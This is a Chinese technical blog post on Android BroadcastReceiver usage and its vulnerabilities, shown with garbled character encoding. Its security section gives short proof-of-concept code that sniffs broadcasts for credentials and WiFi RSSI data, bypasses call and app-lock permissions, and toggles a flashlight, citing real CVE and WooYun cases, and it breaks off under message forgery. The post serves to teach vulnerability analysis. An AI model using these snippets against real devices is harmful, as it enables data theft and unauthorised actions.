<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰å®ä¾‹åŒ–è‡ªå®šä¹‰çš„å¹¿æ’­æ¥æ”¶è€…ï¼Œæˆ‘ä»¬å®ç°å¹¿æ’­çš„åŠŸèƒ½ï¼Œå¯ä»¥ç»§æ‰¿BroadcastReceiverç±»ï¼Œå¹¶é‡å†™ç±»ä¸­çš„æ–¹æ³•</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰å®ä¾‹åŒ–æ„å›¾è¿‡æ»¤å™¨ï¼Œå¹¶è®¾ç½®è¦è¿‡æ»¤çš„å¹¿æ’­ç±»å‹</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰ä½¿ç”¨Contextçš„<span class="built_in">registerReceiver</span>(BroadcastReceiver,IntentFilter)æ–¹æ³•æ³¨å†Œå¹¿æ’­</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰åœ¨<span class="built_in">onDestory</span>()æ–¹æ³•ä¸­é€šè¿‡è°ƒç”¨<span class="built_in">unregisterReceiver</span>()æ–¹æ³•æ¥å®ç°å–æ¶ˆæ³¨å†Œ</span><br></pre></td></tr></table></figure>
<h3 id="å¹¿æ’­çš„ç±»å‹">å¹¿æ’­çš„ç±»å‹</h3>
<h4 id="æ™®é€šå¹¿æ’­">æ™®é€šå¹¿æ’­</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//å¯¹åº”BroadcastReceiverä¸­intentFilterçš„action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//å‘é€å¹¿æ’­</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
<p>è‹¥è¢«æ³¨å†Œäº†çš„å¹¿æ’­æ¥æ”¶è€…ä¸­æ³¨å†Œæ—¶intentFilterçš„actionä¸ä¸Šè¿°åŒ¹é…ï¼Œåˆ™ä¼šæ¥æ”¶æ­¤å¹¿æ’­ï¼ˆå³è¿›è¡Œå›è°ƒonReceive()ï¼‰,å¦‚ä¸‹mBroadcastReceiveråˆ™ä¼šæ¥æ”¶ä¸Šè¿°å¹¿æ’­</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">æ­¤å¹¿æ’­æ¥æ”¶è€…ç±»æ˜¯mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //ç”¨äºæ¥æ”¶ç½‘ç»œçŠ¶æ€æ”¹å˜æ—¶å‘å‡ºçš„å¹¿æ’­</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœå‘é€çš„å¹¿æ’­æœ‰å¯¹åº”æƒé™ï¼Œé‚£ä¹ˆå¹¿æ’­æ¥æ”¶è€…ä¹Ÿéœ€è¦å¯¹åº”æƒé™</p>
<h4 id="ç³»ç»Ÿå¹¿æ’­ï¼š"><strong>ç³»ç»Ÿå¹¿æ’­ï¼š</strong></h4>
<p>Androidä¸­å†…ç½®äº†å¤šä¸ªç³»ç»Ÿå¹¿æ’­ï¼šåªè¦æ¶‰åŠåˆ°æ‰‹æœºçš„åŸºæœ¬æ“ä½œï¼ˆå¦‚å¼€æœºã€ç½‘ç»œçŠ¶æ€å˜åŒ–ã€æ‹ç…§ç­‰ï¼‰ï¼Œéƒ½ä¼šå‘é€ç›¸åº”çš„å¹¿æ’­æ¯ä¸ªå¹¿æ’­éƒ½æœ‰ç‰¹å®šçš„Intent-Filter(åŒ…æ‹¬å…·ä½“çš„action)ï¼ŒAndroidç³»ç»Ÿå¹¿æ’­actionå¦‚ä¸‹ï¼š</p>
<h4 id="æœ‰åºå¹¿æ’­">æœ‰åºå¹¿æ’­</h4>
<p>å‘é€å‡ºå»çš„å¹¿æ’­è¢«å¹¿æ’­æ¥æ”¶è€…æŒ‰ç…§å…ˆåé¡ºåºæ¥æ”¶ æœ‰åºæ˜¯é’ˆå¯¹å¹¿æ’­æ¥æ”¶è€…è€Œè¨€çš„ã€‚å¹¿æ’­æ¥æ”¶è€…æ¥æ”¶å¹¿æ’­çš„é¡ºåºè§„åˆ™ï¼ˆåŒæ—¶é¢å‘é™æ€å’ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­æ¥æ”¶è€…ï¼‰ï¼š</p>
<p>ï¼ˆ1ï¼‰æŒ‰ç…§Priorityå±æ€§å€¼ä»å¤§-å°æ’åº<br>
ï¼ˆ2ï¼‰Priorityå±æ€§ç›¸åŒè€…ï¼ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­ä¼˜å…ˆ</p>
<p><strong>ç‰¹ç‚¹</strong></p>
<p>ï¼ˆ1ï¼‰æ¥æ”¶å¹¿æ’­æŒ‰é¡ºåºæ¥æ”¶<br>
ï¼ˆ2ï¼‰å…ˆæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…å¯ä»¥å¯¹å¹¿æ’­è¿›è¡Œæˆªæ–­ï¼Œå³åæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…ä¸åœ¨æ¥æ”¶æ­¤å¹¿æ’­ï¼Œå¯ä»¥ä½¿ç”¨abortBroadcast()æ–¹æ³•<br>
ï¼ˆ3ï¼‰å…ˆæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…å¯ä»¥å¯¹å¹¿æ’­è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆåæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…å°†æ¥æ”¶åˆ°è¢«ä¿®æ”¹åçš„å¹¿æ’­</p>
<p>å…·ä½“ä½¿ç”¨ï¼šæœ‰åºå¹¿æ’­çš„ä½¿ç”¨è¿‡ç¨‹ä¸æ™®é€šå¹¿æ’­éå¸¸ç±»ä¼¼ï¼Œå·®å¼‚ä»…åœ¨äºå¹¿æ’­çš„å‘é€æ–¹å¼</p>
<p><code>sendOrderedBroadcast(intent,null); //å‚æ•°1ï¼šæ¥æ”¶çš„Intent å‚æ•°2ï¼šä¸æƒé™ç›¸å…³å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬ä¸ºnull</code></p>
<h4 id="æœ¬åœ°å¹¿æ’­">æœ¬åœ°å¹¿æ’­</h4>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºAndroidä¸­çš„å¹¿æ’­å¯ä»¥è·¨<span class="keyword">App</span>ç›´æ¥é€šä¿¡ï¼ˆexportedå¯¹äºæœ‰intent-filteræƒ…å†µä¸‹é»˜è®¤å€¼ä¸ºtrueï¼‰</span><br><span class="line">å¯¼è‡´å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜ï¼š</span><br><span class="line">    ï¼ˆ1ï¼‰å…¶ä»–<span class="keyword">App</span>é’ˆå¯¹æ€§å‘å‡ºä¸å½“å‰<span class="keyword">App</span> intent-filterç›¸åŒ¹é…çš„å¹¿æ’­ï¼Œç”±æ­¤å¯¼è‡´å½“å‰<span class="keyword">App</span>ä¸æ–­æ¥æ”¶å¹¿æ’­å¹¶å¤„ç†</span><br><span class="line">    ï¼ˆ2ï¼‰å…¶ä»–<span class="keyword">App</span>æ³¨å†Œä¸å½“å‰<span class="keyword">App</span>ä¸€è‡´çš„intent-filterç”¨äºæ¥æ”¶å¹¿æ’­ï¼Œè·å–å¹¿æ’­çš„å…·ä½“æ˜Ÿç³»ï¼Œä¼šå‡ºç°å®‰å…¨æ€§å’Œæ•ˆç‡æ€§é—®é¢˜</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="line">ä½¿ç”¨<span class="keyword">App</span>åº”ç”¨å†…å¹¿æ’­ï¼ˆ<span class="keyword">Local</span> Broadcastï¼‰</span><br><span class="line">    (1)<span class="keyword">App</span>åº”ç”¨å†…å¹¿æ’­å¯ç†è§£ä¸ºä¸€ç§å±€éƒ¨å¹¿æ’­ï¼Œå¹¿æ’­çš„å‘é€è€…å’Œæ¥æ”¶è€…éƒ½åŒå±äºä¸€ä¸ª<span class="keyword">App</span></span><br><span class="line">    (2)ç›¸æ¯”äºå…¨å±€å¹¿æ’­ï¼ˆæ™®é€šå¹¿æ’­ï¼‰ï¼Œ<span class="keyword">App</span>åº”ç”¨å†…å¹¿æ’­ä¼˜åŠ¿ä½“ç°åœ¨ï¼šå®‰å…¨æ€§é«˜å’Œæ•ˆç‡é«˜</span><br></pre></td></tr></table></figure>
<p><strong>å®ç°æ­¥éª¤</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•<span class="number">1</span>ï¼š</span><br><span class="line">å°†å…¨å±€å¹¿æ’­è®¾ç½®ä¸ºå±€éƒ¨å¹¿æ’­</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰æ³¨å†Œå¹¿æ’­æ˜¯å°†exportedå±æ€§è®¾ç½®ä¸º<span class="literal">false</span>ï¼Œä½¿å¾—éæœ¬Appå†…éƒ¨å‘å‡ºçš„æ­¤å¹¿æ’­ä¸è¢«æ¥æ”¶</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰åœ¨å¹¿æ’­çš„å‘é€å’Œæ¥æ”¶æ—¶ï¼Œå¢è®¾ç›¸åº”æƒé™permissionï¼Œç”¨äºæƒé™éªŒè¯</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å‘é€å¹¿æ’­æ—¶æŒ‡å®šè¯¥å¹¿æ’­æ¥æ”¶å™¨æ‰€åœ¨çš„åŒ…åï¼Œæ­¤å¹¿æ’­å°†åªä¼šå‘é€åˆ°æ­¤åŒ…ä¸­çš„Appå†…ä¸ä¹‹ç›¸åŒ¹é…çš„æœ‰æ•ˆå¹¿æ’­æ¥æ”¶å™¨ä¸­</span><br><span class="line">é€šè¿‡<span class="built_in">int</span>ent.setPackage(packageName)æŒ‡å®šåŒ…å</span><br><span class="line"> </span><br><span class="line">æ–¹æ³•<span class="number">2</span>ï¼š</span><br><span class="line">    ä½¿ç”¨å°è£…å¥½çš„LocalBroadcastManagerç±»ä½¿ç”¨æ–¹å¼ä¸Šä¸å…¨å±€å¹¿æ’­å‡ ä¹ç›¸åŒï¼Œåªæ˜¯æ³¨å†Œ/å–æ¶ˆæ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨å’Œå‘é€å¹¿æ’­æ—¶å°†å‚æ•°contextå˜æˆLocalBroadcastManagerçš„å•ä¸€å®ä¾‹ã€‚</span><br><span class="line">æ³¨æ„ï¼šå¯¹äºLocalBroadcastManageræ–¹å¼å‘é€çš„åº”ç”¨å†…å¹¿æ’­ï¼Œåªèƒ½é€šè¿‡LocalBroadcastManageråŠ¨æ€æ³¨å†Œï¼Œä¸èƒ½é™æ€æ³¨å†Œ</span><br></pre></td></tr></table></figure>
<p>æ–¹æ³•äºŒçš„å…·ä½“å®ç°ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ³¨å†Œåº”ç”¨å†…å¹¿æ’­æ¥æ”¶å™¨</span></span><br><span class="line"><span class="comment">//æ­¥éª¤1ï¼šå®ä¾‹åŒ–BroadcastReceiverå­ç±» &amp; IntentFilter mBroadcastReceiver</span></span><br><span class="line">mBroadcastReceiver = new mBroadcastReceiver();</span><br><span class="line">IntentFilter <span class="built_in">int</span>entFilter = new IntentFilter();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ­¥éª¤2ï¼šå®ä¾‹åŒ–LocalBroadcastManagerçš„å®ä¾‹</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ­¥éª¤3ï¼šè®¾ç½®æ¥æ”¶å¹¿æ’­çš„ç±»å‹</span></span><br><span class="line"><span class="built_in">int</span>entFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ­¥éª¤4ï¼šè°ƒç”¨LocalBroadcastManagerå•ä¸€å®ä¾‹çš„registerReceiverï¼ˆï¼‰æ–¹æ³•è¿›è¡ŒåŠ¨æ€æ³¨å†Œ</span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, <span class="built_in">int</span>entFilter);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å–æ¶ˆæ³¨å†Œåº”ç”¨å†…å¹¿æ’­æ¥æ”¶å™¨</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å‘é€åº”ç”¨å†…å¹¿æ’­</span></span><br><span class="line">Intent <span class="built_in">int</span>ent = new Intent();</span><br><span class="line"><span class="built_in">int</span>ent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(<span class="built_in">int</span>ent);</span><br></pre></td></tr></table></figure>
<h3 id="BroadcastReceiveræ¼æ´åŸç†åˆ†æ">BroadcastReceiveræ¼æ´åŸç†åˆ†æ</h3>
<p><strong>æ¼æ´ç§ç±»</strong></p>
<ul>
<li>æ•æ„Ÿä¿¡æ¯æ³„éœ²</li>
<li>æƒé™ç»•è¿‡</li>
<li>æ¶ˆæ¯ä¼ªé€ </li>
<li>æ‹’ç»æœåŠ¡</li>
</ul>
<h4 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²">æ•æ„Ÿä¿¡æ¯æ³„éœ²</h4>
<p><strong>åŸç†ä»‹ç»</strong>ï¼š</p>
<p>å‘é€çš„intentæ²¡æœ‰æ˜ç¡®æŒ‡å®šæ¥å—è€…ï¼Œè€Œæ˜¯ç®€å•çš„é€šè¿‡actionè¿›è¡ŒåŒ¹é…ï¼Œæ¶æ„åº”ç”¨ä¾¿å¯ä»¥æ³¨å†Œä¸€ä¸ªå¹¿æ’­æ¥æ”¶è€…å—…æ¢æ‹¦æˆªåˆ°è¿™ä¸ªå¹¿æ’­ï¼Œå¦‚æœè¿™ä¸ªå¹¿æ’­å­˜åœ¨æ•æ„Ÿæ•°æ®ï¼Œå°±è¢«æ¶æ„åº”ç”¨çªƒå–äº†ã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ¡ˆä¾‹1</p>
<p>ç›®æ ‡ç¨‹åºæ®µä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡intentéšå¼ä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥ç¼–å†™ä¸€ä¸ªæ¥å—è€…ä»£ç ï¼Œå“åº”actionç„¶åè·å–æ•æ„Ÿæ•°æ®</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¡ˆä¾‹äºŒï¼š<a target="_blank" rel="noopener" href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android æ“ä½œç³»ç»Ÿä¸­é€šè¿‡ RSSI å¹¿æ’­æš´éœ²æ•æ„Ÿæ•°æ® ï¼ˆCVE-2018-9581)</a></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Androidæ“ä½œç³»ç»Ÿä¼šå®šæœŸåœ¨ç³»ç»ŸèŒƒå›´å†…å¹¿æ’­WiFIå¼ºåº¦å€¼ï¼ˆRSSIï¼‰,RSSIå€¼è¡¨ç¤ºè®¾å¤‡æ¥æ”¶åˆ°çš„ä¿¡å·</span><br><span class="line">çš„ç›¸å¯¹å¼ºåº¦ï¼ˆæ›´é«˜=æ›´å¼ºï¼‰ï¼Œä½†ä¸å®é™…ç‰©ç†å¼ºåº¦dBmæ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œè¿™æ˜¯é€šè¿‡ä¸¤ä¸ªç‹¬ç«‹çš„intentså®ç°çš„ï¼ŒAndroid <span class="number">9</span>ä¹‹å‰æ˜¯android.net.wifi.STATE_CHANGEï¼Œå…¶ä»–å®‰å“è®¾å¤‡æ˜¯android.net.wifi.RSSI_CHANGED</span><br><span class="line">    å½“åº”ç”¨é€šè¿‡WifiManagerè®¿é—®ä¿¡æ¯æ—¶ï¼Œæ­£å¸¸å°±åœ¨åº”ç”¨manifestä¸­è¯·æ±‚ACCESS_WIFI_STATEæƒé™ã€‚å› ä¸º<span class="built_in">WiFi</span> RTTç‰¹å¾æ˜¯Android <span class="number">9</span>ä¸­æ–°å¼•å…¥çš„ï¼Œä¹Ÿæ˜¯ç”¨äºä½ç½®å®šä½çš„ï¼Œéœ€è¦ACCESS_FINE_LOCATIONæƒé™ã€‚ä½†ç›‘å¬ç³»ç»Ÿå¹¿æ’­æ—¶ï¼Œ</span><br><span class="line">åœ¨ä¸éœ€è¦é€šçŸ¥ç”¨æˆ·ï¼Œä¸éœ€è¦å…¶ä»–æƒé™çš„æƒ…å†µä¸‹å°±å¯ä»¥è·å–ä¿¡æ¯</span><br><span class="line">    å­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼š</span><br><span class="line">    ï¼ˆ<span class="number">1</span>ï¼‰RSSIå€¼æ˜¯é€šè¿‡å¹¿æ’­è·å–çš„ï¼Œç»•è¿‡çš„æ­£å¸¸çš„æƒé™æ£€æŸ¥ï¼ˆACCESS_WIFI_STATEï¼‰</span><br><span class="line">    ï¼ˆ<span class="number">2</span>ï¼‰é€šè¿‡å¹¿æ’­æˆ–WiFimanagerè·å–çš„RSSIå€¼å¯ä»¥åœ¨ä¸éœ€è¦å…¶ä»–ä½ç½®æƒé™çš„æƒ…å†µä¸‹è¿›è¡Œå®¤å†…å®šåˆ¶</span><br></pre></td></tr></table></figure>
<p>æ”»å‡»ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();       </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    â€¦.</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="æƒé™ç»•è¿‡">æƒé™ç»•è¿‡</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>åŠ¨æ€æ³¨å†Œçš„å¹¿æ’­é»˜è®¤éƒ½æ˜¯å¯¼å‡ºçš„ï¼Œå¦‚æœå¯¼å‡ºçš„BroadcastReceiveræ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œå¯¼è‡´BroadcastReceiverç»„ä»¶å¯ä»¥æ¥æ”¶ä¸€ä¸ªå¤–éƒ¨å¯æ§çš„urlã€æˆ–è€…å…¶ä»–å‘½ä»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¶Šæƒåˆ©ç”¨åº”ç”¨çš„ä¸€äº›ç‰¹å®šåŠŸèƒ½ï¼Œæ¯”å¦‚å‘é€æ¶æ„å¹¿æ’­ã€ä¼ªé€ æ¶ˆæ¯ã€ä»»æ„åº”ç”¨ä¸‹è½½å®‰è£…ã€æ‰“å¼€é’“é±¼ç½‘ç«™ç­‰</p>
<p>æ¡ˆä¾‹ï¼š<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">å°ç±³MIUIæ¼æ´å¯èƒ½å¯¼è‡´ç¡¬ä»¶èµ„æºæ¶ˆè€—</a></p>
<p><strong>æ¼æ´è¯¦æƒ…</strong></p>
<p>MIUIå†…ç½®çš„æ‰‹ç”µç­’è½¯ä»¶Stk.apkä¸­ï¼ŒTorchServiceæœåŠ¡æ²¡æœ‰å¯¹å¹¿æ’­æ¥æºè¿›è¡ŒéªŒè¯ï¼Œå¯¼è‡´ä»»ä½•ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªæœåŠ¡ï¼Œæ‰“å¼€æˆ–å…³é—­æ‰‹ç”µç­’ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥å¯¼è‡´ç³»ç»Ÿç”µæºè¿…é€Ÿæ¶ˆè€—</p>
<p>æ”»å‡»ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
<p>æ¡ˆä¾‹ï¼š<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">é…·æ´¾æœ€å®‰å…¨æ‰‹æœºs6æ‹¨æ‰“ç”µè¯æƒé™ç»•è¿‡</a></p>
<p>æ¼æ´è¯¦æƒ…ï¼š</p>
<p>é…·æ´¾æœ€å®‰å…¨æ‰‹æœºs6æ‹¨æ‰“ç”µè¯æƒé™ç»•è¿‡ï¼Œç¬¬ä¸‰æ–¹appå¯ä»¥æ— éœ€æ‹¨æ‰“ç”µè¯æƒé™ç›´æ¥æ‹¨æ‰“ç”µè¯</p>
<p><strong>æ”»å‡»ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
<p>æ¡ˆä¾‹ï¼š<a target="_blank" rel="noopener" href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">é…·æ´¾æœ€å®‰å…¨æ‰‹æœºs6ç¨‹åºé”ç»•è¿‡</a></p>
<p>æ¼æ´è¯¦æƒ…ï¼š</p>
<p>ç¨‹åºåŠ é”è§£é”æ˜¯é å¹¿æ’­æ¥æ§åˆ¶çš„ï¼Œå¹¶ä¸”è¿™ä¸¤æ¡å¹¿æ’­æ²¡åšæƒé™é™åˆ¶ï¼Œä»»æ„åº”ç”¨å¯ä»¥å‘é€æ­¤å¹¿æ’­è¾¾åˆ°æ¶æ„è§£é”ã€æ¶æ„é”å®šåº”ç”¨çš„ç›®çš„</p>
<p><strong>æ¼æ´æµ‹è¯•</strong></p>
<p>ç”¨adb shell å‘é€å¹¿æ’­ï¼Œç”¨æ¥è§£é”</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.PACKAGE_FULLY_REMOVED</span> -d package:com<span class="selector-class">.wumii</span><span class="selector-class">.android</span>.mimi</span><br></pre></td></tr></table></figure>
<h4 id="æ¶ˆæ¯ä¼ªé€ -2">æ¶ˆæ¯ä¼ªé€ </h4>
<p><strong>æ¼æ´åŸç†</strong></p>
